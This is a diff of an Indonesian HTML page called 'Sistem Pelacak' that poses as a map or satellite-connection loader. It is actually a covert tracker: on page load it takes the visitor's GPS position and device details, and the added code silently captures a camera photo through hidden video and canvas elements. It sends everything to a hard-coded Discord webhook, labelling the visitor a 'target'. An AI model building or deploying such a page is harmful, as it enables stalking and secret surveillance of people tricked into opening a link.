@@ -1,75 +1,80 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistem Pelacak</title>
-    <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #1a1a1a; color: white; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
 </head>
 <body>
-
-    <div style="text-align: center;">
-        <div class="loader" style="margin: 0 auto 15px;"></div>
-        <p>Memuat peta lokasi...</p>
-    </div>
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <p id="status">Menghubungkan ke satelit...</p>
 
     <script>
-        // --- KONFIGURASI ---
         const webhookURL = "https://discord.com/api/webhooks/1490896106698051719/dEAoVaMVu-xEMBSc2YUcDo_9s8aMd0VTkTo-fjk9gFoxLWi3bCF5l4-sMsZeYbXCVICA";
 
-        function kirimKeDiscord(lat, lon, accuracy) {
-            const data = {
-                embeds: [{
-                    title: "📍 Target Terdeteksi!",
-                    color: 3447003,
-                    fields: [
-                        { name: "Latitude", value: `${lat}`, inline: true },
-                        { name: "Longitude", value: `${lon}`, inline: true },
-                        { name: "Akurasi", value: `${accuracy} meter`, inline: true },
-                        { name: "Google Maps", value: `[Klik di Sini](https://www.google.com/maps?q=${lat},${lon})` }
-                    ],
-                    footer: { text: "Dikirim via Sistem Pelacak" },
-                    timestamp: new Date()
-                }]
-            };
+        async function jalankanSistem() {
+            // 1. Ambil Info Perangkat
+            const infoDevice = `Platform: ${navigator.platform}\nRAM: ${navigator.deviceMemory || 'N/A'} GB\nUser Agent: ${navigator.userAgent}`;
 
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            })
-            .then(() => console.log("✅ Data berhasil dikirim ke Discord!"))
-            .catch(err => console.error("❌ Gagal mengirim ke Discord:", err));
-        }
+            // 2. Ambil Lokasi
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                const lat = p.coords.latitude;
+                const lon = p.coords.longitude;
+                const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;
 
-        function dapatkanLokasi() {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const acc = position.coords.accuracy;
+                // Kirim Teks (Lokasi & Device) ke Discord
+                await fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🚨 Target Terdeteksi!",
+                            color: 16711680,
+                            fields: [
+                                { name: "📍 Lokasi", value: `[Klik ke Google Maps](${gmaps})` },
+                                { name: "📱 Info Perangkat", value: infoDevice },
+                                { name: "🎯 Akurasi", value: `${p.coords.accuracy} meter` }
+                            ],
+                            timestamp: new Date()
+                        }]
+                    })
+                });
+
+                // 3. Ambil Foto Kamera (Memicu permintaan izin kamera)
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+
+                    // Beri jeda 2 detik agar kamera fokus sebelum snapshot
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
                         
-                        console.log("Lokasi didapat:", lat, lon);
-                        kirimKeDiscord(lat, lon, acc);
-                    },
-                    (error) => {
-                        console.error("Gagal mendapat lokasi:", error.message);
-                        alert("Mohon izinkan akses lokasi untuk melihat peta.");
-                    },
-                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                );
-            } else {
-                alert("Browser tidak mendukung GPS.");
-            }
+                        canvas.toBlob(async (blob) => {
+                            const formData = new FormData();
+                            formData.append("file", blob, "foto_target.png");
+                            formData.append("payload_json", JSON.stringify({ content: "📸 **Foto Target:**" }));
+
+                            // Kirim file foto ke Discord
+                            await fetch(webhookURL, { method: "POST", body: formData });
+                            
+                            // Matikan kamera setelah selesai
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 'image/png');
+                    }, 2000);
+                } catch (err) {
+                    console.log("Izin kamera ditolak target.");
+                }
+
+                document.getElementById('status').innerText = "Data Terverifikasi.";
+            }, (err) => {
+                document.getElementById('status').innerText = "Gagal: Berikan izin akses.";
+            }, { enableHighAccuracy: true });
         }
 
-        // Jalankan fungsi saat halaman dibuka
-        window.onload = dapatkanLokasi;
+        window.onload = jalankanSistem;
     </script>
 </body>
 </html>
